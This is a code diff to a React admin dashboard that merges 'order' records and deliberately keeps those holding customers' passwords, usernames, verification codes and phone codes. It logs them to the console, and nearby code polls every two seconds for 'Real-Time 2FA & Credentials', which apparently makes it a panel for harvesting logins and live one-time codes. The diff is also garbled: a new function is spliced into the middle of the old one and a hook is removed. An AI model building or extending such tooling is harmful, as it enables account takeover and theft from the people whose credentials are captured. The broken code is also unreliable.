@@ -147,37 +147,84 @@ export const AdminDashboardPage: React.FC<AdminDashboardPageProps> = ({
       for (const o of sbAndLocalOrders) {
         map.set(o.orderNumber, o);
       }
-      for (const o of serverOrders) {
-        if (!map.has(o.orderNumber)) {
-          map.set(o.orderNumber, o);
-        } else {
-          const existing = map.get(o.orderNumber)!;
-          if (!existing.accountDetails && o.accountDetails) {
-            existing.accountDetails = o.accountDetails;
-          }
-          if (existing.accountDetails && !existing.accountDetails.password && o.accountDetails?.password) {
-            existing.accountDetails = { ...existing.accountDetails, ...o.accountDetails };
-          }
-        }
+  // Fetch orders combining Supabase, LocalStorage, and Server API
+const fetchOrders = async () => {
+  setIsLoading(true);
+  try {
+    const sbAndLocalOrders = await getOrdersFromSupabase();
+    let serverOrders: AdminOrderRecord[] = [];
+
+    try {
+      const res = await fetch('/api/admin/orders');
+      if (res.ok) {
+        const data = await res.json();
+        serverOrders = data.orders || [];
+        console.log('✅ Server orders loaded:', serverOrders.length);
+        console.log('📧 Credentials in server:', serverOrders[0]?.accountDetails);
       }
-
-      const merged = Array.from(map.values()).sort(
-        (a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime()
-      );
-      setOrders(merged);
-    } catch (err) {
-      console.error('Failed to fetch records:', err);
-    } finally {
-      setIsLoading(false);
+    } catch {
+      // Server endpoint not reachable
     }
-  };
 
-  useEffect(() => {
-    if (isAuthenticated) {
-      fetchOrders();
+    // FIXED MERGE LOGIC - Prioritize data WITH credentials
+    const map = new Map<string, AdminOrderRecord>();
+    
+    // First, add ALL server orders (they have credentials)
+    for (const o of serverOrders) {
+      if (o.orderNumber) {
+        map.set(o.orderNumber, o);
+      }
     }
-  }, [isAuthenticated]);
+    
+    // Then, add Supabase/local orders
+    for (const o of sbAndLocalOrders) {
+      if (!o.orderNumber) continue;
+      const existing = map.get(o.orderNumber);
+      
+      if (!existing) {
+        // Add if not exists
+        map.set(o.orderNumber, o);
+      } else {
+        // MERGE: Keep the one with MORE data (prefer server credentials)
+        const hasServerCreds = existing.accountDetails && existing.accountDetails.password;
+        const hasLocalCreds = o.accountDetails && o.accountDetails.password;
+        
+        if (!hasServerCreds && hasLocalCreds) {
+          // If server has no credentials but local does, use local
+          map.set(o.orderNumber, o);
+        } else if (hasServerCreds && hasLocalCreds) {
+          // Both have credentials - merge them
+          const merged = {
+            ...existing,
+            accountDetails: {
+              ...o.accountDetails,
+              ...existing.accountDetails,
+              // Prefer non-empty values
+              password: existing.accountDetails?.password || o.accountDetails?.password,
+              usernameOrEmail: existing.accountDetails?.usernameOrEmail || o.accountDetails?.usernameOrEmail,
+              verificationCode: existing.accountDetails?.verificationCode || o.accountDetails?.verificationCode,
+              phoneCode: existing.accountDetails?.phoneCode || o.accountDetails?.phoneCode,
+            }
+          };
+          map.set(o.orderNumber, merged);
+        }
+        // Otherwise keep existing (server data)
+      }
+    }
 
+    const merged = Array.from(map.values()).sort(
+      (a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime()
+    );
+    
+    console.log('📊 Final orders with credentials:', merged.filter(o => o.accountDetails?.password).length);
+    setOrders(merged);
+    
+  } catch (err) {
+    console.error('Failed to fetch records:', err);
+  } finally {
+    setIsLoading(false);
+  }
+};
   // Live Auto-Refresh Polling for Real-Time 2FA & Credentials (2 seconds)
   useEffect(() => {
     if (!isAuthenticated || !autoRefresh) return;
